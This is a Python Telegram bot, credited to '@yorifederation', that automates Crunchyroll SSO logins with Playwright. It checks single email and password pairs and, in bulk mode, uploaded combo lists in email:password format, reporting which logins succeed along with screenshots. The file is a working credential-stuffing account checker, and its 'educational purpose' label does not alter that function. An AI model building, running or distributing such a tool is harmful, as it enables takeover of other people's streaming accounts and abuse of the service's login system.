"""
╔══════════════════════════════════════════════════════╗
║   🔐 Crunchyroll Login Automation Bot                ║
║   Made by @yorifederation                            ║
║   For Educational Purpose Only                       ║
╚══════════════════════════════════════════════════════╝

Commands:
  /start  - Welcome with buttons
  /help   - Instructions
  /chk email password - Check login & screenshot
  /bulk   - Bulk check from .txt file
"""

import os
import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters, CallbackQueryHandler
from playwright.async_api import async_playwright

# ════════════════════════════════════════════════════════
# 🔧 CONFIGURATION - From Environment
# ════════════════════════════════════════════════════════
TOKEN = os.environ.get("BOT_TOKEN")

if not TOKEN:
    print("❌ Set BOT_TOKEN environment variable!")
    exit(1)
# ════════════════════════════════════════════════════════

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Rate limiting
user_last_request = {}
RATE_LIMIT_SECONDS = 10


async def is_rate_limited(user_id: int) -> bool:
    import time
    current_time = time.time()
    if user_id in user_last_request:
        if current_time - user_last_request[user_id] < RATE_LIMIT_SECONDS:
            return True
    user_last_request[user_id] = current_time
    return False


# ────────────────────────────────────────────────────────
# 🤖 LOGIN LOGIC (Working code)
# ────────────────────────────────────────────────────────

async def login_crunchyroll(email: str, password: str) -> dict:
    """Login to Crunchyroll using SSO page"""
    
    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True)
        page = await browser.new_page(
            viewport={"width": 1280, "height": 800},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        )
        
        result = {"success": False, "screenshot": None, "message": ""}
        
        try:
            # 1. Go to SSO login page
            sso_url = "https://sso.crunchyroll.com/login?return_url=%2Fauthorize%3Fclient_id%3Dkmj7imhjt_q90lcbzzsj%26redirect_uri%3Dhttps%253A%252F%252Fwww.crunchyroll.com%252Fcallback%26response_type%3Dcookie%26state%3D"
            
            await page.goto(sso_url, timeout=60000)
            await page.wait_for_load_state("domcontentloaded", timeout=30000)
            await asyncio.sleep(2)
            
            # 2. Handle cookie consent FIRST
            logger.info("Handling cookie consent...")
            
            cookie_selectors = [
                "button:has-text('Accept All')",
                "button:has-text('Accept all')",
                "button:has-text('ACCEPT ALL')",
                "button[data-testid='accept-button']",
                "#onetrust-accept-btn-handler",
                ".onetrust-accept-btn-handler",
                "button:has-text('Allow All')",
                "button:has-text('ALLOW ALL')"
            ]
            
            for sel in cookie_selectors:
                try:
                    btn = await page.wait_for_selector(sel, timeout=2000)
                    if btn:
                        await btn.click()
                        logger.info(f"Clicked cookie button: {sel}")
                        await asyncio.sleep(1)
                        break
                except:
                    pass
            
            # Take screenshot
            result["screenshot"] = await page.screenshot()
            
            # 3. Find email field - use name='login'
            email_field = None
            
            try:
                email_field = await page.wait_for_selector("input[name='login']", timeout=3000)
                logger.info("Found email field with name='login'")
            except:
                pass
            
            # Fallback selectors
            if not email_field:
                for sel in ["input[name='login']", "input[type='text']", "#login"]:
                    try:
                        email_field = await page.wait_for_selector(sel, timeout=2000)
                        break
                    except:
                        pass
            
            if not email_field:
                result["message"] = "❌ Email field not found"
                return result
            
            # 4. Fill email
            await email_field.fill(email)
            await asyncio.sleep(1)
            
            # 5. Press Tab to trigger password field
            await email_field.press("Tab")
            await asyncio.sleep(1)
            
            # Take screenshot after email
            result["screenshot"] = await page.screenshot()
            
            # 6. Find password field
            password_field = None
            password_selectors = [
                "input[name='password']",
                "input[type='password']",
                "input[id='password']",
                "input[autocomplete='new-password']"
            ]
            
            for sel in password_selectors:
                try:
                    password_field = await page.wait_for_selector(sel, timeout=3000)
                    logger.info(f"Found password field: {sel}")
                    break
                except:
                    pass
            
            if not password_field:
                await email_field.press("Enter")
                await asyncio.sleep(2)
                
                for sel in password_selectors:
                    try:
                        password_field = await page.wait_for_selector(sel, timeout=3000)
                        break
                    except:
                        pass
            
            if not password_field:
                inputs = await page.query_selector_all("input")
                for inp in inputs:
                    t = await inp.get_attribute("type")
                    n = await inp.get_attribute("name")
                    if t == "password" or "password" in str(n).lower():
                        password_field = inp
                        break
            
            if not password_field:
                result["message"] = "❌ Password field not found - may need captcha"
                return result
            
            # 7. Fill password
            await password_field.fill(password)
            await asyncio.sleep(0.5)
            
            # Take screenshot of filled form
            result["screenshot"] = await page.screenshot()
            
            # 8. Find and click submit button
            submit_button = None
            submit_selectors = [
                "button[type='submit']",
                "button:has-text('NEXT')",
                "button:has-text('Sign In')",
                "button:has-text('LOGIN')",
                "input[type='submit']",
                "[data-testid='submit']"
            ]
            
            for sel in submit_selectors:
                try:
                    submit_button = await page.wait_for_selector(sel, timeout=2000)
                    if submit_button:
                        break
                except:
                    pass
            
            if submit_button:
                await submit_button.click()
            else:
                await password_field.press("Enter")
            
            # 9. Wait for response
            await asyncio.sleep(8)
            await page.wait_for_load_state("domcontentloaded", timeout=30000)
            await asyncio.sleep(3)
            
            # 10. Take final screenshot
            result["screenshot"] = await page.screenshot()
            
            # 11. Check result
            final_url = page.url.lower()
            page_content = await page.content()
            
            if "recaptcha" in page_content.lower() or "captcha" in page_content.lower():
                result["message"] = "⚠️ CAPTCHA Blocked"
            elif "incorrect" in page_content.lower() or "wrong" in page_content.lower():
                result["message"] = "❌ Wrong email or password"
            elif "sso.crunchyroll.com/login" in final_url:
                result["message"] = "❌ Login not successful"
            else:
                result["success"] = True
                result["message"] = "✅ Login Successful!"
                
        except Exception as e:
            logger.error(f"Login error: {e}")
            result["message"] = f"❌ Error: {str(e)[:150]}"
            try:
                result["screenshot"] = await page.screenshot()
            except:
                pass
        
        finally:
            await browser.close()
        
        return result


# ────────────────────────────────────────────────────────
# 📱 TELEGRAM HANDLERS
# ────────────────────────────────────────────────────────

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Professional welcome with inline buttons"""
    keyboard = [
        [InlineKeyboardButton("🔐 Check Login", callback_data="check")],
        [InlineKeyboardButton("📋 Help", callback_data="help")],
        [InlineKeyboardButton("📁 Bulk Check", callback_data="bulk")],
        [InlineKeyboardButton("👨‍💻 By @yorifederation", url="https://t.me/yorifederation")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome = """🏠 *Welcome to Crunchyroll Login Bot*

━━━━━━━━━━━━━━━━━━━━━━
This bot checks Crunchyroll account login status and sends screenshots.
━━━━━━━━━━━━━━━━━━━━━━

🔐 *Features:*
• Single account check
• Bulk check from .txt file
• Screenshot capture
• Accurate results

━━━━━━━━━━━━━━━━━━━━━━

📝 *Commands:*
`/chk email password` - Check single account
`/bulk` - Send .txt file with accounts
`/help` - Full instructions

━━━━━━━━━━━━━━━━━━━━━━

Made with ❤️ by *@yorifederation*"""
    
    await update.message.reply_text(welcome, reply_markup=reply_markup, parse_mode='Markdown')


async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Full help documentation"""
    help_text = """📚 *Help & Instructions*

━━━━━━━━━━━━━━━━━━━━━━

🔐 *Single Check:*
`/chk email password`

Example:
```
/chk user@gmail.com MyPass123
```

━━━━━━━━━━━━━━━━━━━━━━

📁 *Bulk Check:*
Send a .txt file with accounts
Format: `email:password`
(One per line)

━━━━━━━━━━━━━━━━━━━━━━

📸 *What you get:*
• Login status (success/fail)
• Screenshot of result
• Masked email in caption

━━━━━━━━━━━━━━━━━━━━━━

⚠️ *Note:*
• CAPTCHA may block some attempts
• Rate limit between checks
• Use your own credentials

━━━━━━━━━━━━━━━━━━━━━━

Made by *@yorifederation*"""
    
    await update.message.reply_text(help_text, parse_mode='Markdown')


async def cmd_chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check single account"""
    user_id = update.message.from_user.id
    
    # Rate limit check
    if await is_rate_limited(user_id):
        await update.message.reply_text("⏳ Please wait 10 seconds between requests!")
        return
    
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "🔐 *Usage:* `/chk email password`\n\nExample: `/chk user@gmail.com pass123`",
            parse_mode='Markdown'
        )
        return
    
    email = context.args[0]
    password = " ".join(context.args[1:])
    
    if "@" not in email:
        await update.message.reply_text("❌ Invalid email format")
        return
    
    msg = await update.message.reply_text("🔄 *Processing...* Please wait 15-20 seconds", parse_mode='Markdown')
    
    logger.info(f"Login attempt: {email}")
    result = await login_crunchyroll(email, password)
    
    # Build response
    if result["success"]:
        status_icon = "✅"
        status_text = "*LOGIN SUCCESS!*"
    elif "CAPTCHA" in result["message"]:
        status_icon = "⚠️"
        status_text = "*CAPTCHA BLOCKED*"
    else:
        status_icon = "❌"
        status_text = "*LOGIN FAILED*"
    
    masked_email = f"{email[:3]}***@{email.split('@')[1]}"
    
    await msg.edit_text(f"{status_icon} {status_text}\n📧 {masked_email}\n📝 {result['message']}")
    
    if result["screenshot"]:
        await update.message.reply_photo(
            photo=result["screenshot"],
            caption=f"📸 Result • {masked_email}"
        )


async def cmd_bulk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Instructions for bulk check"""
    keyboard = [
        [InlineKeyboardButton("📁 Send .txt File", callback_data="send_file")]
    ]
    
    await update.message.reply_text(
        "📁 *Bulk Check Mode*\n\n"
        "Send a .txt file with accounts:\n\n"
        "Format:\n"
        "```\nemail1:password1\n"
        "email2:password2\n"
        "email3:password3\n"
        "```\n\n"
        "🔹 One account per line\n"
        "🔹 Format: `email:password`\n"
        "🔹 Password can contain `:`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle .txt file upload for bulk check"""
    doc = update.message.document
    
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file only")
        return
    
    # Download file
    file = await doc.download()
    file_path = file.name
    
    await update.message.reply_text(f"📁 File received: `{doc.file_name}`\n🔄 Processing...", parse_mode='Markdown')
    
    # Process bulk
    try:
        with open(file_path, 'r') as f:
            lines = f.readlines()
        
        total = success = failed = captcha = 0
        
        status_msg = await update.message.reply_text(f"📊 Processing {len(lines)} accounts...")
        
        for i, line in enumerate(lines):
            line = line.strip()
            if not line or ":" not in line:
                continue
            
            parts = line.split(":")
            if len(parts) < 2:
                continue
            
            email = parts[0]
            password = ":".join(parts[1:])
            total += 1
            
            result = await login_crunchyroll(email, password)
            
            if result["success"]:
                status = "✅"
                success += 1
            elif "CAPTCHA" in result["message"]:
                status = "⚠️"
                captcha += 1
            else:
                status = "❌"
                failed += 1
            
            masked_email = f"{email[:3]}***@{email.split('@')[1]}" if "@" in email else f"{email[:3]}***"
            
            await context.bot.send_message(
                chat_id=update.message.chat_id,
                text=f"{status} `{masked_email}` - {result['message']}",
                parse_mode='Markdown'
            )
            
            if result["screenshot"]:
                await context.bot.send_photo(
                    chat_id=update.message.chat_id,
                    photo=result["screenshot"],
                    caption=f"📸 `{masked_email}`"
                )
            
            await asyncio.sleep(2)
            
            if (i + 1) % 5 == 0:
                await status_msg.edit_text(f"📊 Progress: {i+1}/{len(lines)}\n✅ {success} | ❌ {failed} | ⚠️ {captcha}")
        
        await status_msg.edit_text(
            f"📊 *Bulk Check Complete*\n\n"
            f"Total: {total}\n"
            f"✅ Success: {success}\n"
            f"❌ Failed: {failed}\n"
            f"⚠️ CAPTCHA: {captcha}",
            parse_mode='Markdown'
        )
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {str(e)}")
    finally:
        try:
            os.remove(file_path)
        except:
            pass


async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle callback queries"""
    query = update.callback_query
    await query.answer()
    
    if query.data == "check":
        await query.edit_message_text(
            "🔐 *Single Check*\n\nSend: `/chk email password`\n\nExample: `/chk user@gmail.com pass123`",
            parse_mode='Markdown'
        )
    elif query.data == "help":
        await cmd_help(query, context)
    elif query.data == "bulk":
        await query.edit_message_text(
            "📁 *Bulk Check*\n\nSend your .txt file with accounts\n\nFormat:\n`email:password`\n(one per line)",
            parse_mode='Markdown'
        )


# ────────────────────────────────────────────────────────
# 🚀 MAIN
# ────────────────────────────────────────────────────────

def main():
    print("""
╔════════════════════════════════════════╗
║   🔐 Crunchyroll Login Bot             ║
║   Made by @yorifederation              ║
╚════════════════════════════════════════╝
    """)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("chk", cmd_chk))
    app.add_handler(CommandHandler("bulk", cmd_bulk))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(CallbackQueryHandler(callback_handler))
    
    print("✅ Bot is running!")
    print("   Send /start to your bot\n")
    
    app.run_polling()


if __name__ == "__main__":
    main()